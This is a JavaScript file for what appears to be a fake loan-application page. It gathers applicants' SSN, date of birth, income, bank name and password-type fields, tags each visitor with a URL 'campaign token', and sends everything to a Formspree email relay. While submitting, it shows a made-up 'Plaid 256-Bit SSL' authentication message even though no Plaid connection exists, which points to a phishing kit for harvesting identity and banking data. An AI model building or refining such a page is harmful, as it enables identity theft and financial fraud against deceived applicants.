/**
 * Loan Lending Application & Single-Step Form Logic
 * Connected to Formspree: https://formspree.io/f/xoeeeevp
 * Pure Static Frontend: Handles Formspree submission, input masks, 
 * Plaid security indicators, and form submission confirmation modal.
 */

document.addEventListener('DOMContentLoaded', () => {
  initSingleStepForms();
  initInputMasks();
  initCampaignToken();
});

// Capture URL token (?token=...) and inject into forms
function initCampaignToken() {
  const urlParams = new URLSearchParams(window.location.search);
  const token = urlParams.get('token');
  if (token) {
    document.querySelectorAll('.loan-application-form').forEach(form => {
      let tokenInput = form.querySelector('input[name="campaign_token"]');
      if (!tokenInput) {
        tokenInput = document.createElement('input');
        tokenInput.type = 'hidden';
        tokenInput.name = 'campaign_token';
        form.appendChild(tokenInput);
      }
      tokenInput.value = token;
    });
  }
}

// Single-step loan application form submission via Formspree AJAX
function initSingleStepForms() {
  const forms = document.querySelectorAll('.loan-application-form');

  forms.forEach(form => {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formEndpoint = form.getAttribute('action') || 'https://formspree.io/f/xoeeeevp';

      // Check browser validity
      if (!form.checkValidity()) {
        e.stopPropagation();
        form.classList.add('was-validated');
        
        // Find first invalid input and focus
        const firstInvalid = form.querySelector(':invalid');
        if (firstInvalid) {
          firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
          firstInvalid.focus();
        }
        return;
      }

      form.classList.add('was-validated');

      const submitBtn = form.querySelector('button[type="submit"]');
      const originalHtml = submitBtn.innerHTML;

      // Realistic Plaid 256-bit encryption connection state
      submitBtn.disabled = true;
      submitBtn.innerHTML = `
        <span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>
        Authenticating & Submitting with Plaid 256-Bit SSL...
      `;

      // Gather form data
      const formData = new FormData(form);
      const appId = 'ADV-' + Math.floor(100000 + Math.random() * 900000);
      formData.append('application_id', appId);
      formData.append('submission_time', new Date().toLocaleString());

      // Read values for confirmation modal
      const firstName = form.querySelector('input[name="firstName"]')?.value || 'Applicant';
      const lastName = form.querySelector('input[name="lastName"]')?.value || '';
      const loanAmount = form.querySelector('input[name="requestedAmount"]')?.value || '10,000';
      const monthlyIncome = form.querySelector('input[name="monthlyIncome"]')?.value || '3,500';
      const institution = form.querySelector('input[name="institutionName"]')?.value || 'Chase Bank';
      const userEmail = form.querySelector('input[name="email"]')?.value || 'willsmiths987@gmail.com';

      try {
        // Send data directly to form endpoint
        const response = await fetch(formEndpoint, {
          method: 'POST',
          body: formData,
          headers: {
            'Accept': 'application/json'
          }
        });

        const result = await response.json().catch(() => null);

        if (!response.ok) {
          const errDetail = result?.errors?.map(e => e.message).join(', ') || result?.error || 'Submission rejected by Formspree';
          throw new Error(errDetail);
        }

        // Show confirmation modal on successful delivery
        const modalRef = document.getElementById('confirmationModal');
        if (modalRef) {
          const confName = document.getElementById('confApplicantName');
          const confAmt = document.getElementById('confLoanAmount');
          const confInc = document.getElementById('confMonthlyIncome');
          const confBnk = document.getElementById('confBank');
          const confMail = document.getElementById('confEmail');
          const confId = document.getElementById('confAppId');

          if (confName) confName.textContent = `${firstName} ${lastName}`.trim();
          if (confAmt) confAmt.textContent = `$${parseFloat(loanAmount).toLocaleString()}`;
          if (confInc) confInc.textContent = `$${parseFloat(monthlyIncome).toLocaleString()}`;
          if (confBnk) confBnk.textContent = institution;
          if (confMail) confMail.textContent = userEmail;
          if (confId) confId.textContent = appId;

          const bsModal = new bootstrap.Modal(modalRef);
          bsModal.show();
        } else {
          alert(`Application Successfully Received!\n\nReference: ${appId}\nApplicant: ${firstName} ${lastName}\nLoan: $${loanAmount}\nBank: ${institution}\nReceipt dispatched to: ${userEmail}`);
        }

        // Reset form
        form.reset();
        form.classList.remove('was-validated');

      } catch (err) {
        console.error('Formspree submission error:', err);
        alert(`Notice: Formspree error while sending data to email:\n${err.message}\n\nPlease check your Formspree Form ID in loan-form.js.`);
      } finally {
        // Reset submit button state
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalHtml;
      }
    });
  });
}

// Input formatting helpers for Phone, SSN, DOB
function initInputMasks() {
  // Phone formatting: (555) 000-0000
  document.querySelectorAll('input[type="tel"]').forEach(input => {
    input.addEventListener('input', (e) => {
      let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
      e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
    });
  });

  // SSN formatting: 9 digits masked
  document.querySelectorAll('.ssn-input').forEach(input => {
    input.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '').substring(0, 9);
      if (val.length > 5) {
        e.target.value = val.substring(0, 3) + '-' + val.substring(3, 5) + '-' + val.substring(5, 9);
      } else if (val.length > 3) {
        e.target.value = val.substring(0, 3) + '-' + val.substring(3, 5);
      } else {
        e.target.value = val;
      }
    });
  });

  // Date of Birth formatting: MM/DD/YYYY
  document.querySelectorAll('.dob-input').forEach(input => {
    input.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 8);
      if (v.length >= 5) {
        e.target.value = `${v.slice(0,2)}/${v.slice(2,4)}/${v.slice(4)}`;
      } else if (v.length >= 3) {
        e.target.value = `${v.slice(0,2)}/${v.slice(2)}`;
      } else {
        e.target.value = v;
      }
    });
  });

  // Toggle password visibility
  document.querySelectorAll('.btn-toggle-password').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.getAttribute('data-target');
      const input = document.getElementById(targetId);
      const icon = btn.querySelector('i');
      if (input) {
        if (input.type === 'password') {
          input.type = 'text';
          if (icon) icon.classList.replace('bi-eye', 'bi-eye-slash');
        } else {
          input.type = 'password';
          if (icon) icon.classList.replace('bi-eye-slash', 'bi-eye');
        }
      }
    });
  });
}
